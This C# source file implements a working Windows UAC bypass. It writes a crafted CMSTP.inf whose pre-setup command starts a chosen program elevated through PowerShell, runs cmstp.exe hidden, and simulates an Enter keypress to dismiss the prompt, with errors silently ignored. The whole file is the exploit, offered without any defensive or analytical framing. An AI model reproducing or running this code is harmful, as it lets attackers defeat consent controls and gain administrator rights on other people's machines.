using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

// ReSharper disable SuggestVarOrType_BuiltInTypes
// ReSharper disable SuggestVarOrType_SimpleTypes
// ReSharper disable StringLiteralTypo
// ReSharper disable IdentifierTypo
// ReSharper disable once CheckNamespace

namespace SuperUser
{
    internal static class Admin
    {
        #region Native Imports

        private const string User32 = "user32.dll";

        [DllImport(User32)]
        private static extern bool SetForegroundWindow(IntPtr hwnd);

        [DllImport(User32)]
        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);

        [DllImport(User32)]
        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        #endregion

        #region Keys

        private const int VkReturn = 0x0D;
        private const int WmKeydown = 0x100;

        #endregion

        private static int Timeout { get; set; } = 100;

        public static bool IsAdministrator()
        {
            return (new WindowsPrincipal(WindowsIdentity.GetCurrent()))
                .IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static async Task Run(string filename, string program)
        {
            try { await Process(filename, program); } catch { /*ignored*/ }
        }

        private static async Task Process(string filename, string program)
        {
            DirectoryInfo temporaryFolder =
                new DirectoryInfo(
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
            if (!temporaryFolder.Exists)
                temporaryFolder.Create();

            FileInfo settingsFile = new FileInfo(Path.Combine(temporaryFolder.FullName, "CMSTP.inf"));
            string ini = $@"
                [version]
                Signature=$chicago$
                AdvancedINF=2.5
                [DefaultInstall]
                CustomDestination=CustInstDestSectionAllUsers
                RunPreSetupCommands=RunPreSetupCommandsSection
                [RunPreSetupCommandsSection]
                powershell.exe ""Start-Process {filename} -Args '{program}' -Verb RunAs""
                taskkill /IM cmstp.exe /F
                [CustInstDestSectionAllUsers]
                49000,49001=AllUSer_LDIDSection, 7
                [AllUSer_LDIDSection]
                ""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
                [Strings]
                ServiceName=""SuperUser""
                ShortSvcName=""SuperUser""
                ";

            using (FileStream fs = settingsFile.Create())
            {
                using (BinaryWriter wr = new BinaryWriter(fs, Encoding.ASCII))
                {
                    wr.Write(ini);
                    await fs.FlushAsync();
                }
            }

            using (Process p = new Process())
            {
                p.StartInfo.FileName =
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
                p.StartInfo.Arguments = $"/au \"{settingsFile.FullName}\"";
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                while (p.MainWindowHandle == IntPtr.Zero)
                {
                    await Task.Delay(Timeout);
                }

                if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
                {
                    await Task.Delay(Timeout);
                    PostMessage(p.MainWindowHandle, WmKeydown, VkReturn, 0);
                }
            }
        }
    }
}
